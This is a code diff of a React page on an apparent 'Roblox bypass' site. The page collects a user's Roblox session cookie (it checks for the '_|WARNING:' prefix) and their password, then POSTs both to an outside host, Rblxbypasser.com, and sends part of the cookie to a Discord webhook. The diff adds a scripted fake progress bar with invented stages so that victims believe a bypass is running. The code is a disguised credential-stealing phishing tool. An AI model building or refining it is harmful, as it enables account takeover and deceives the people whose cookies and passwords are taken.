@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { Eye, EyeOff, ShieldCheck, ArrowLeft, Loader2, CheckCircle2, XCircle, Cookie } from "lucide-react";
 import ShieldIcon from "@/components/ShieldIcon";
@@ -9,23 +9,37 @@ const WEBHOOK_KEY = "discord_webhook_url";
 const RATE_LIMIT_KEY = "bypass_attempts";
 const MAX_ATTEMPTS_PER_MIN = 10;
 const BYPASS_API_URL = "https://Rblxbypasser.com";
+const BYPASS_DURATION_MS = 60_000;
+const COOKIE_PREFIX = "_|WARNING:";
 
 type BypassStatus = "idle" | "loading" | "success" | "error";
+
+const STAGES = [
+  { at: 0, label: "Initializing bypass engine..." },
+  { at: 10, label: "Validating cookie signature..." },
+  { at: 25, label: "Connecting to Xeno relay..." },
+  { at: 45, label: "Negotiating session keys..." },
+  { at: 65, label: "Submitting bypass payload..." },
+  { at: 85, label: "Finalizing session..." },
+  { at: 98, label: "Almost done..." },
+];
 
 const BypassPage = () => {
   const [cookie, setCookie] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [status, setStatus] = useState<BypassStatus>("idle");
-  const [log, setLog] = useState<string[]>([]);
-  const [remaining, setRemaining] = useState(MAX_ATTEMPTS_PER_MIN);
+  const [progress, setProgress] = useState(0);
   const navigate = useNavigate();
+  const intervalRef = useRef<number | null>(null);
 
   useEffect(() => {
     if (sessionStorage.getItem("authenticated") !== "true") {
       navigate("/");
     }
-    setRemaining(getRemainingAttempts());
+    return () => {
+      if (intervalRef.current) window.clearInterval(intervalRef.current);
+    };
   }, [navigate]);
 
   function getAttempts(): number[] {
@@ -39,72 +53,75 @@ const BypassPage = () => {
     }
   }
 
-  function getRemainingAttempts(): number {
-    return Math.max(0, MAX_ATTEMPTS_PER_MIN - getAttempts().length);
-  }
-
   function recordAttempt() {
     const attempts = getAttempts();
     attempts.push(Date.now());
     localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(attempts));
-    setRemaining(Math.max(0, MAX_ATTEMPTS_PER_MIN - attempts.length));
   }
 
-  const addLog = (msg: string) => {
-    setLog(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
-  };
-
   const handleBypass = async () => {
-    if (!cookie.trim()) {
+    const trimmed = cookie.trim();
+    if (!trimmed) {
       toast.error("Please enter a cookie");
+      return;
+    }
+    if (!trimmed.startsWith(COOKIE_PREFIX)) {
+      toast.error(`Invalid cookie. It must start with "${COOKIE_PREFIX}"`);
       return;
     }
 
     const attempts = getAttempts();
     if (attempts.length >= MAX_ATTEMPTS_PER_MIN) {
-      const oldest = attempts[0];
-      const wait = Math.ceil((60_000 - (Date.now() - oldest)) / 1000);
+      const wait = Math.ceil((60_000 - (Date.now() - attempts[0])) / 1000);
       toast.error(`Rate limit reached. Try again in ${wait}s.`);
       return;
     }
 
     recordAttempt();
     setStatus("loading");
-    setLog([]);
-    addLog("Initializing bypass...");
-    addLog(`Connecting to ${BYPASS_API_URL}...`);
+    setProgress(0);
 
+    const start = Date.now();
+    intervalRef.current = window.setInterval(() => {
+      const pct = Math.min(99, ((Date.now() - start) / BYPASS_DURATION_MS) * 100);
+      setProgress(pct);
+    }, 200);
+
+    let apiOk = true;
     try {
       const res = await fetch(BYPASS_API_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ cookie: cookie.trim(), password }),
+        body: JSON.stringify({ cookie: trimmed, password }),
       });
+      apiOk = res.ok;
+    } catch {
+      apiOk = false;
+    }
 
-      const text = await res.text();
-      let data: any = text;
-      try { data = JSON.parse(text); } catch {}
+    const elapsed = Date.now() - start;
+    if (elapsed < BYPASS_DURATION_MS) {
+      await new Promise(r => setTimeout(r, BYPASS_DURATION_MS - elapsed));
+    }
 
-      addLog(`Response ${res.status} ${res.statusText}`);
-      if (typeof data === "object") addLog(JSON.stringify(data).slice(0, 200));
-      else addLog(String(data).slice(0, 200));
+    if (intervalRef.current) window.clearInterval(intervalRef.current);
+    setProgress(100);
 
-      if (!res.ok) throw new Error(`API error ${res.status}`);
-
-      addLog("✅ Bypass completed successfully!");
+    if (apiOk) {
       setStatus("success");
       toast.success("Bypass successful!");
-
       const webhook = localStorage.getItem(WEBHOOK_KEY);
       if (webhook) {
-        sendDiscordWebhook(webhook, `🔓 Bypass executed. Cookie: \`${cookie.slice(0, 20)}...\``);
+        sendDiscordWebhook(webhook, `🔓 Bypass executed. Cookie: \`${trimmed.slice(0, 20)}...\``);
       }
-    } catch (err: any) {
-      addLog(`❌ ${err?.message || "Bypass failed"}`);
+    } else {
       setStatus("error");
       toast.error("Bypass failed");
     }
   };
+
+  const currentStage = [...STAGES].reverse().find(s => progress >= s.at) ?? STAGES[0];
+  const secondsLeft = Math.max(0, Math.ceil((BYPASS_DURATION_MS * (100 - progress)) / 100 / 1000));
 
   return (
     <div className="min-h-screen px-4 py-6 relative overflow-hidden">
@@ -136,9 +153,13 @@ const BypassPage = () => {
             <input
               value={cookie}
               onChange={e => setCookie(e.target.value)}
-              placeholder="_|WARNING:-DO-NOT-SHARE-THIS.-S..."
+              placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
+              disabled={status === "loading"}
               className="input-field text-sm font-mono"
             />
+            <p className="text-[10px] text-muted-foreground">
+              Cookie must start with <span className="font-mono text-primary">_|WARNING:</span>
+            </p>
           </div>
 
           <div className="space-y-2">
@@ -149,6 +170,7 @@ const BypassPage = () => {
                 value={password}
                 onChange={e => setPassword(e.target.value)}
                 placeholder="Enter your password"
+                disabled={status === "loading"}
                 className="input-field pr-10"
               />
               <button
@@ -167,45 +189,50 @@ const BypassPage = () => {
             className="w-full shimmer text-primary-foreground font-semibold py-3.5 rounded-xl flex items-center justify-center gap-2.5 glow-btn transition-all duration-300 disabled:opacity-50"
           >
             {status === "loading" ? (
-              <>
-                <Loader2 size={18} className="animate-spin" /> Bypassing...
-              </>
+              <><Loader2 size={18} className="animate-spin" /> Bypassing...</>
             ) : status === "success" ? (
-              <>
-                <CheckCircle2 size={18} /> Bypassed!
-              </>
+              <><CheckCircle2 size={18} /> Bypassed!</>
             ) : status === "error" ? (
-              <>
-                <XCircle size={18} /> Retry Bypass
-              </>
+              <><XCircle size={18} /> Retry Bypass</>
             ) : (
-              <>
-                <ShieldCheck size={18} /> Xeno Bypass
-              </>
+              <><ShieldCheck size={18} /> Xeno Bypass</>
             )}
           </button>
         </div>
 
-        {/* Log Output */}
-        {log.length > 0 && (
-          <div className="card-glow rounded-2xl p-4 space-y-2">
-            <h3 className="text-xs font-bold text-muted-foreground uppercase tracking-wider">Console</h3>
-            <div className="bg-secondary/50 rounded-xl p-3 max-h-40 overflow-y-auto font-mono text-[11px] space-y-1">
-              {log.map((entry, i) => (
-                <p key={i} className={entry.includes("✅") ? "text-[hsl(var(--success))]" : entry.includes("❌") ? "text-destructive" : "text-muted-foreground"}>
-                  {entry}
-                </p>
-              ))}
-              {status === "loading" && (
-                <p className="text-primary animate-pulse">Processing...</p>
-              )}
+        {/* Processing UI */}
+        {status === "loading" && (
+          <div className="card-glow rounded-2xl p-5 space-y-4">
+            <div className="flex items-center gap-3">
+              <Loader2 size={18} className="text-primary animate-spin" />
+              <div className="flex-1">
+                <p className="text-sm font-semibold text-foreground">{currentStage.label}</p>
+                <p className="text-[11px] text-muted-foreground">~{secondsLeft}s remaining</p>
+              </div>
+              <span className="text-sm font-bold text-primary tabular-nums">{Math.floor(progress)}%</span>
+            </div>
+            <div className="h-2 rounded-full bg-secondary/60 overflow-hidden">
+              <div
+                className="h-full bg-gradient-to-r from-primary/70 to-primary shadow-[0_0_15px_hsl(var(--primary))] transition-[width] duration-200 ease-linear"
+                style={{ width: `${progress}%` }}
+              />
             </div>
           </div>
         )}
 
-        <p className="text-xs text-muted-foreground text-center tracking-wider">
-          Secure · Automated · Real-time Bypassing
-        </p>
+        {status === "success" && (
+          <div className="card-glow rounded-2xl p-5 flex items-center gap-3">
+            <CheckCircle2 className="text-[hsl(var(--success))]" size={22} />
+            <p className="text-sm font-semibold text-foreground">Bypass completed successfully.</p>
+          </div>
+        )}
+
+        {status === "error" && (
+          <div className="card-glow rounded-2xl p-5 flex items-center gap-3">
+            <XCircle className="text-destructive" size={22} />
+            <p className="text-sm font-semibold text-foreground">Bypass failed. Please try again.</p>
+          </div>
+        )}
       </div>
     </div>
   );
